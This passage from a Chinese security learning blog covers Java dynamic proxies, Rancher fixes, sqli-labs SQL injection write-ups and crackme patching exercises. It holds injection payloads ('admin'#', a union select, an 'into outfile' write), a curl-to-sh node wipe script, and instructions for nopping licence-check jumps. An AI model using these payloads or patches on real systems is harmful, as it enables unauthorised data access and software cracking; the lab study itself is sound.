<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>动态代理，简单的说就是用一个代理类帮我们动态生成了不同类的代理，我们不需要手动针对每个委托类编写一个队形的代理类。</p>
<blockquote>
<p>InvocationHandler接口：负责提供调用代理操作。</p>
<p>是由代理对象调用处理器实现的接口，定义了一个invoke()方法，每个代理对象都有一个关联的接口。当代理对象上调用方法时，该方法会被自动转发到InvocationHandler.invoke()方法来进行调用。</p>
</blockquote>
<p>看代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TestDelegate</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestImp</span> <span class="keyword">implements</span>  <span class="title class_">TestDelegate</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dynamic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="comment">//中间类必须要实现InvocationHandler</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Agency</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object target;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">bind</span><span class="params">(Object target)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.target=target;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过传入进来的target（委托）类，通过直接得到他的类加载器，实现的接口和当前的invoationHandler来返回一个新的代理，相比于静态代理我们需要手动写一个代理类，动态代理根据传入的参数自动生成一个代理类</span></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(),<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//代理被执行代码的时候 invoke()会被call</span></span><br><span class="line">        <span class="comment">//这里你可以通过判断方法名等等，做出不同的修改</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Delegate Start&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">res</span> <span class="operator">=</span> method.invoke(target,args);<span class="comment">//此处使用了反射,使用target里面的method</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Delegate End...&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> dynamic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Agency</span> <span class="variable">agency</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Agency</span>();</span><br><span class="line">        <span class="type">TestDelegate</span> <span class="variable">test</span> <span class="operator">=</span> (TestDelegate) agency.bind(<span class="keyword">new</span> <span class="title class_">TestImp</span>());<span class="comment">//此处我们得到了一个代理类（动态生成的）</span></span><br><span class="line">        System.getProperties().put(<span class="string">&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;</span>,<span class="string">&quot;true&quot;</span>);<span class="comment">//这里会有生成的动态代理类的字节码文件</span></span><br><span class="line">        test.sayHello();<span class="comment">//执行该代理类的方法时，代理类中的invoke()会被call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/image/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E4%B8%8E%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86-5/image-20210811223911668.png" alt="image-20210811223911668"></p>
<p>由此可见，动态代理的作用：</p>
<ul>
<li><p>动态代理只需要实现一个代理类，而静态代理需要实现多个代理类</p>
</li>
<li><p>解耦，通过参数就可以判断真实类，不需要实现实例化，更加灵活多变</p>
</li>
</ul>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.zhihu.com/question/20794107/answer/658139129">Java 动态代理作用是什么？ - bravo1988的回答 - 知乎 </a></p>
<p><a href="https://www.zhihu.com/question/20794107/answer/23330381">Java 动态代理作用是什么？ - ZeaTalk的回答 - 知乎</a></p>
<p><a href="https://b1ngz.github.io/java-dynamic-proxy/">Java Dynamic Proxy</a></p>
<p><a href="https://medium.com/@shohraafaque/proxies-in-java-static-dynamic-8ccc51d16346">Proxies in Java — Static &amp; Dynamic</a></p>
<p><a href="https://xz.aliyun.com/t/9197">JAVA安全基础（三）– java动态代理机制</a></p>
<p><a href="http://wjlshare.com/archives/1430">Java 静态代理&amp;动态代理学习</a></p>
<p><a href="https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/">Java 反序列化漏洞(5) – 解密 YSoSerial : Java动态代理机制</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Deserialization</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Rancher Resolved Issues</title>
    <url>/2022/08/21/Rancher-resolved-issues/</url>
    <content><![CDATA[<h1 id="Rancher-Problems-and-Solutions"><a href="#Rancher-Problems-and-Solutions" class="headerlink" title="Rancher Problems and Solutions"></a>Rancher Problems and Solutions</h1><h2 id="Quickly-Clean-a-Node"><a href="#Quickly-Clean-a-Node" class="headerlink" title="Quickly Clean a Node"></a>Quickly Clean a Node</h2><p>Nodes need to be cleaned completely, use the following script.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://gist.githubusercontent.com/Ileriayo/1bef407602208911e86f42d5d208c1fb/raw/af8fa882add9c0a7ccd72b92f1cfab5c95c355ba/nuke_rancher_kube_node.sh | sh</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="Waiting-for-API-Readey-False-xxx-mins-ago-Disconnected-Cluster-agent-is-not-connected"><a href="#Waiting-for-API-Readey-False-xxx-mins-ago-Disconnected-Cluster-agent-is-not-connected" class="headerlink" title="Waiting for API [Readey False xxx mins ago [Disconnected] Cluster agent is not connected]"></a>Waiting for API [Readey False xxx mins ago [Disconnected] Cluster agent is not connected]</h2><p>The newest version of rancher brought this error to me, I’m not sure about the cause.</p>
<blockquote>
<p>Waiting for API [Readey False xxx mins ago [Disconnected] Cluster agent is not connected].</p>
</blockquote>
<p><strong>Solution</strong></p>
<ul>
<li>What I used: changed <strong>Rancher</strong> to <strong>2.5.15(2.5x stable version)</strong>, choose <strong>19.x Kubernetes</strong></li>
<li>Another method suggested by others (but not working for me)<ul>
<li><a href="https://github.com/rancher/rancher/issues/36589">https://github.com/rancher/rancher/issues/36589</a></li>
</ul>
</li>
</ul>
<h2 id="Waiting-for-Kubernetes-API-to-be-available"><a href="#Waiting-for-Kubernetes-API-to-be-available" class="headerlink" title="Waiting for Kubernetes API to be available"></a>Waiting for Kubernetes API to be available</h2><p><strong>Solution</strong></p>
<ul>
<li><p>Setting up hosts for all nodes.</p>
<ul>
<li>```bash<br>hostnamectl set-hostname node1<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- Writing <span class="built_in">to</span> <span class="keyword">the</span> `hosts` <span class="built_in">file</span>  <span class="keyword">for</span> all nodes</span><br><span class="line"></span><br><span class="line">  - ```bash</span><br><span class="line">    vi /etc/hosts</span><br><span class="line">    <span class="comment">#192.168.2.121 node1</span></span><br><span class="line">    <span class="comment">#192.168.2.122 node2</span></span><br><span class="line">    <span class="comment">#192.168.2.123 node3</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Shut down <strong>firewall</strong>, <strong>selinux</strong>, and <strong>swap</strong></p>
<ul>
<li><pre><code class="bash">sudo systemctl stop firewalld
sudo systemctl disable firewalld

#shut selinux： 
sed -i &#39;s/enforcing/disabled/&#39; /etc/selinux/config
setenforce 0

#shut swap：
swapoff -a  
sed -ri &#39;s/.*swap.*/#&amp;/&#39; /etc/fstab 
</code></pre>
</li>
</ul>
</li>
</ul>
<h2 id="Master-node-unavailable-after-shutting-down-a-worker-node"><a href="#Master-node-unavailable-after-shutting-down-a-worker-node" class="headerlink" title="Master node unavailable after shutting down a worker node"></a>Master node unavailable after shutting down a worker node</h2><p>I encountered this problem when I used only two nodes for the Kubernetes cluster, which is only one master node(with worker installed) and one worker node</p>
<p><strong>Solution</strong></p>
<ul>
<li>Having one more worker node. When a worker node is unavailable, after 5 minutes, a new pod will be created on another available working node automatically.</li>
</ul>
]]></content>
      <tags>
        <tag>Rancher</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL二次注入填坑(Sqlilab 第24关)</title>
    <url>/2021/07/06/SQL%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%A1%AB%E5%9D%91-Sqlilab-%E7%AC%AC24%E5%85%B3/</url>
    <content><![CDATA[<h1 id="SQL二次注入填坑-Sqlilab-第24关"><a href="#SQL二次注入填坑-Sqlilab-第24关" class="headerlink" title="SQL二次注入填坑(Sqlilab 第24关)"></a>SQL二次注入填坑(Sqlilab 第24关)</h1><p>在练习sql注入的时候我有一个不好的习惯，就是总是看别人的提示，没有给自己养成一个自我思考、尝试的习惯。所以这次决定把每一步思路都记录下来，自己尝试。</p>
<span id="more"></span>

<h2 id="尝试登录POST注入（失败）"><a href="#尝试登录POST注入（失败）" class="headerlink" title="尝试登录POST注入（失败）"></a>尝试登录POST注入（失败）</h2><p>先尝试了黑盒测试，各种注入都不报错，然后去代码审计，在Login.php里，可以看到<img src="/image/SQL%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%A1%AB%E5%9D%91-Sqlilab-%E7%AC%AC24%E5%85%B3/image-20210706183658126.png" alt="image-20210706183658126"></p>
<p><code>username</code> 和 <code>password</code>都被<strong>mysql_real_escape_string</strong>做了处理，所以登录POST处的注入就不再想了</p>
<h2 id="尝试二次注入（成功）"><a href="#尝试二次注入（成功）" class="headerlink" title="尝试二次注入（成功）"></a>尝试二次注入（成功）</h2><h3 id="修改其他用户密码"><a href="#修改其他用户密码" class="headerlink" title="修改其他用户密码"></a>修改其他用户密码</h3><p>在post注入行不通后，我发现可以创建新用户和登录</p>
<p>随便创建了一个用户：<code>username:123,密码123456</code>，登录后发现有需改密码选项，所以猜测修改密码选项的语句是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Update users set password = <span class="string">&#x27;111&#x27;</span> where username = <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password = <span class="string">&#x27;123&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这里的<code>username</code>可能是存在注入的，但因为创建用户的时候，我们的<code>username</code>和<code>password</code>都被转义过了，该怎么办呢？</p>
<p>实际上，因为这个创建用户时的转移函数<code>mysql_real_escape_string()</code>会在引号前加入反斜杠<code>\</code>, 比如<code>admin&#39;#</code> 会变成<code>admin\&#39;#</code>， 但存入数据库的时候,数据库会自动移除<code>\</code>,所以存进数据库的还是<code>admin&#39;#</code></p>
<p>那么回到刚才<strong>修改密码</strong>的语句，当我们进行修改密码的时候，语句会变为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Update users set password = <span class="string">&#x27;123&#x27;</span> where username = <span class="string">&#x27;admin&#x27;</span><span class="comment">#&#x27; and password = &#x27;123&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>所以虽然我们登录的是<code>admin&#39;#</code>这个账号，但却修改了<code>admin</code>的密码</p>
<h3 id="扩散思维"><a href="#扩散思维" class="headerlink" title="扩散思维"></a>扩散思维</h3><p>既然二次注入可以利用，那么我们可以利用这个干点别的事</p>
<p>假设：如果我们现在php页面上有一个打印所有user信息的user表，我们甚至可以直接用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,user(),database()#</span><br></pre></td></tr></table></figure>

<p>把信息union到打出来的这张表上。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇到<strong>转义</strong>的函数如<code>mysql_real_escape_string()</code>，考虑数据进入数据库后会被还原的情况，再找取出这个数据的地方，即可完成二次注入。</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>SQL Injection</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQL Injection</tag>
        <tag>SQLilab</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入文件读写问题</title>
    <url>/2021/07/04/SQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="SQL注入中的文件读写问题"><a href="#SQL注入中的文件读写问题" class="headerlink" title="SQL注入中的文件读写问题"></a>SQL注入中的文件读写问题</h1><p>在SQLilab第七关中遇到了文件写不出来的问题，经过查询资料，最后终于解决问题，总结如下</p>
<span id="more"></span>

<h2 id="读写权限"><a href="#读写权限" class="headerlink" title="读写权限"></a>读写权限</h2><ul>
<li><p><strong>数据库用户读取权限</strong></p>
<blockquote>
<p>and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。<br>and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误，应该是管理员给数据库帐户降权</p>
</blockquote>
</li>
<li><p><strong>数据库读写权限：</strong></p>
<p>新版的MYSQL会有权限限制：</p>
<p>查看权限：<code>show global variables like &#39;%secure%&#39;</code> </p>
<p>得到下图：<img src="/image/SQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E9%97%AE%E9%A2%98/image-20210704223102960.png" alt="image-20210704223102960"></p>
</li>
</ul>
<blockquote>
<p>secure_file_priv = 空的时候 ，任意读写</p>
<p>secure_file_priv = 某个路径的时候，只能在规定的那个路径下读写</p>
<p>secure_file_priv = NULL 不能读写</p>
</blockquote>
<h2 id="修改数据库读写权限"><a href="#修改数据库读写权限" class="headerlink" title="修改数据库读写权限"></a>修改数据库读写权限</h2><p>以<strong>phpstudy_pro</strong>为例</p>
<ul>
<li><img src="/image/SQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E9%97%AE%E9%A2%98/image-20210704223705953.png" alt="image-20210704223705953"></li>
<li>在mysqld处添加<img src="/image/SQL%E6%B3%A8%E5%85%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E9%97%AE%E9%A2%98/image-20210704223736958.png" alt="image-20210704223736958"></li>
</ul>
<h2 id="写出文件"><a href="#写出文件" class="headerlink" title="写出文件"></a>写出文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3 into outfile &#x27;D:\\222.txt&#x27;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Web Security</category>
        <category>SQL Injection</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQL Injection</tag>
        <tag>SQLilab</tag>
      </tags>
  </entry>
  <entry>
    <title>NCK逆向课后作业writeup</title>
    <url>/2021/12/02/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>个人的一些逆向小练习和解题思路</p>
<p>每天一道</p>
<span id="more"></span>

<h1 id="课后小程序下载地址"><a href="#课后小程序下载地址" class="headerlink" title="课后小程序下载地址"></a>课后小程序下载地址</h1><p>链接：<a href="https://pan.baidu.com/s/1U-LK9lZf4CjVjUCuSSFIlQ">https://pan.baidu.com/s/1U-LK9lZf4CjVjUCuSSFIlQ</a><br>提取码：k5pf </p>
<h1 id="第一课课后作业"><a href="#第一课课后作业" class="headerlink" title="第一课课后作业"></a>第一课课后作业</h1><h2 id="软件使用"><a href="#软件使用" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203152510850.png" alt="image-20211203152510850"></p>
<h2 id="MessageBoxA-API断点"><a href="#MessageBoxA-API断点" class="headerlink" title="MessageBoxA API断点"></a>MessageBoxA API断点</h2><p>通过信息框，猜测有<code>MessageBox</code> API被调用，<code>ctrl+g</code>找到调用处，直接下断点</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203152727330.png" alt="image-20211203152727330"></p>
<p>点击按钮后让他在此处断下。</p>
<p>看见右下方堆栈顶端显示了CALL的返回地址，右键跟随反汇编窗口。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203152857114.png" alt="image-20211203152857114"></p>
<p>这里跟随到的是返回地址，这样我们就可以找到这个<code>MessageBoxA</code>的返回地址了。</p>
<p>在此处下断点，继续运行，让他断到这里来。往上看了下，好像并没有看见什么明显的判断条件，继续F8。<img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203153141019.png" alt="image-20211203153141019"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203153406827.png" alt="image-20211203153406827"></p>
<p>往上面找，但发现这个我们猜测的成功的call并没有命令跳过它。继续往上看，发现又有2个这样的call，同时有个je跳过了这2个call</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203153609778.png" alt="image-20211203153609778"></p>
<p>基本可以确定是这个跳转的问题了。</p>
<p>直接nop掉。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203153658090.png" alt="image-20211203153658090"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203153721601.png" alt="image-20211203153721601"></p>
<h2 id="交叉引用查找法"><a href="#交叉引用查找法" class="headerlink" title="交叉引用查找法"></a>交叉引用查找法</h2><p>先是在OD里字符串搜索，发现找不到字符串“注册失败” - OD里的各种插件可能会导致这个问题。于是转用IDA。</p>
<p>视图-》子视图-》字符串， 搜索<code>注册失败</code></p>
<blockquote>
<p>搜索字符串还是搜索不到?</p>
<p>在快捷方式处添加<code>-dCULTURE=all</code></p>
</blockquote>
<p>找到后双击跟过去<img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203154530079.png" alt="image-20211203154530079"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203154638521.png" alt="image-20211203154638521"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203154720897.png" alt="image-20211203154720897"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203154812809.png" alt="image-20211203154812809"></p>
<p>上面的JE就是关键跳了。NOP掉即可</p>
<h2 id="内存查找法"><a href="#内存查找法" class="headerlink" title="内存查找法"></a>内存查找法</h2><p>我们知道软件在运行的时候，函数的数据是会保存在内存里的</p>
<p>如果我们运行软件后将他暂停，再看内存窗口的话，可以查找到字符串</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203155354377.png" alt="image-20211203155354377"></p>
<p>内存断点或硬件断点即可。</p>
<p>注意，如果硬件断点不起作用，可能是OD的问题，它各种反调试插件、汉化等等都可能导致这个问题，我们可以使用<strong>x64dbg.</strong></p>
<h2 id="栈回溯-ALT-K暂停法"><a href="#栈回溯-ALT-K暂停法" class="headerlink" title="栈回溯 ALT+K暂停法"></a>栈回溯 ALT+K暂停法</h2><p>软件再执行call的时候，会把一些参数都压入堆栈，最后执行完后再pop出来，我们可以在弹出信息框的时候给他暂停，这样参数都会保留在stack中，这时我们再去OD的K窗口（栈回溯窗口），就能看到function的信息了。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203155835217.png" alt="image-20211203155835217"></p>
<h2 id="GetWindowTextA-API断点"><a href="#GetWindowTextA-API断点" class="headerlink" title="GetWindowTextA API断点"></a>GetWindowTextA API断点</h2><p>对<code>GetWindowTextA</code> API进行断点，执行程序后被断下，一直F8。</p>
<p>发现在做比较，正确的字符串已经获取到了。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211203160619957.png" alt="image-20211203160619957"></p>
<p>后续就不分析了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前一直以为从断下的地方跳一层就会回到主函数下面，导致这么简单都没搞出来，事实上跳N层都是有可能的。</p>
<h1 id="第二课课后作业"><a href="#第二课课后作业" class="headerlink" title="第二课课后作业"></a>第二课课后作业</h1><h2 id="软件使用-1"><a href="#软件使用-1" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204090025209.png" alt="image-20211204090025209"></p>
<h2 id="栈溯源法-ALT-K暂停法"><a href="#栈溯源法-ALT-K暂停法" class="headerlink" title="栈溯源法 ALT+K暂停法"></a>栈溯源法 ALT+K暂停法</h2><p>加载程序后运行，点击按钮让他弹出信息框，然后暂停。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204090912027.png" alt="image-20211204090912027"></p>
<p>在窗口K中找到堆栈信息，双击</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204090935331.png" alt="image-20211204090935331"></p>
<p>发现有跳转，直接enter进入</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204090953203.png" alt="image-20211204090953203"></p>
<p>在此处断点</p>
<p>再让程序跑一次，找到最终返回的地方。</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204091114188.png" alt="image-20211204091114188"></p>
<p>此处跳过了成功消息，将JNZ改为NOP</p>
<h2 id="交叉引用断点"><a href="#交叉引用断点" class="headerlink" title="交叉引用断点"></a>交叉引用断点</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204093044610.png" alt="image-20211204093044610"></p>
<p>在OD处修改即可。</p>
<p><strong>如何在IDA修改？</strong></p>
<p>选项-》常规-》操作数字节-》16</p>
<p>编辑-》修补程序-》汇编</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204093940723.png" alt="image-20211204093940723"></p>
<p>nop两次把这两个都填充</p>
<p>编辑-》修补程序-》修补程序到输入文件</p>
<p>EA起始为你的基址</p>
<p>生成即可</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204094300480.png" alt="image-20211204094300480"></p>
<h2 id="补丁使用"><a href="#补丁使用" class="headerlink" title="补丁使用"></a>补丁使用</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211204094354057.png" alt="image-20211204094354057"></p>
<h1 id="第三课课后作业"><a href="#第三课课后作业" class="headerlink" title="第三课课后作业"></a>第三课课后作业</h1><h2 id="软件使用-2"><a href="#软件使用-2" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205103356194.png" alt="image-20211205103356194"></p>
<h2 id="MessageBoxA-API断点-1"><a href="#MessageBoxA-API断点-1" class="headerlink" title="MessageBoxA API断点"></a>MessageBoxA API断点</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205103426796.png" alt="image-20211205103426796"></p>
<p>发现带壳，之后得用补丁。</p>
<p>先让程序运行起来，下断点MessageBoxA</p>
<p>找到关键跳，需要修改JE为nop</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205103920873.png" alt="image-20211205103920873"></p>
<h2 id="补丁使用-1"><a href="#补丁使用-1" class="headerlink" title="补丁使用"></a>补丁使用</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205104024600.png" alt="image-20211205104024600"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205104112887.png" alt="image-20211205104112887"></p>
<h1 id="第四课课后作业"><a href="#第四课课后作业" class="headerlink" title="第四课课后作业"></a>第四课课后作业</h1><h2 id="E语言写内存补丁"><a href="#E语言写内存补丁" class="headerlink" title="E语言写内存补丁"></a>E语言写内存补丁</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205104706503.png" alt="image-20211205104706503"></p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205104725383.png" alt="image-20211205104725383"></p>
<h2 id="E语言写劫持补丁"><a href="#E语言写劫持补丁" class="headerlink" title="E语言写劫持补丁"></a>E语言写劫持补丁</h2><p>检测数据是否被壳还原 -》 检测004010A9地址的数据是否为0x55(85)</p>
<p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205124112526.png" alt="image-20211205124112526"></p>
<h2 id="C语言写内存补丁"><a href="#C语言写内存补丁" class="headerlink" title="C语言写内存补丁"></a>C语言写内存补丁</h2><p><img src="/image/NCK%E9%80%86%E5%90%91%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9Awriteup/image-20211205124716992.png" alt="image-20211205124716992"></p>
<p>这里主要是用<code>OpenProcess()</code>和<code>WriteProcessMemory()</code>来完成内存写入操作的。</p>
<h1 id="第五课课后作业"><a href="#第五课课后作业" class="headerlink" title="第五课课后作业"></a>第五课课后作业</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>这一课涉及到了很多知识点，我花了两三天的事件才慢慢把各个知识点理清楚。 主要涉及到了硬件断点、硬件HOOK和线程方面的知识，虽然老师只讲了一节课，但是自己真正弄清楚并实践还是得费不少时间。另外我使用的VS2022版本给我带来了不少麻烦，各种不兼容，还好最后解决了，之后可能会出一些解决VS问题的合集。</p>
<p>该课后作业的要求是<strong>不修改代码从而实现破解。</strong></p>
<h2 id="软件使用-3"><a href="#软件使用-3" class="headerlink" title="软件使用"></a>软件使用</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208125058597.png" alt="image-20211208125058597"></p>
<h2 id="SetWindowTextA-寻找关键跳"><a href="#SetWindowTextA-寻找关键跳" class="headerlink" title="SetWindowTextA 寻找关键跳"></a>SetWindowTextA 寻找关键跳</h2><p>OD载入发现有壳</p>
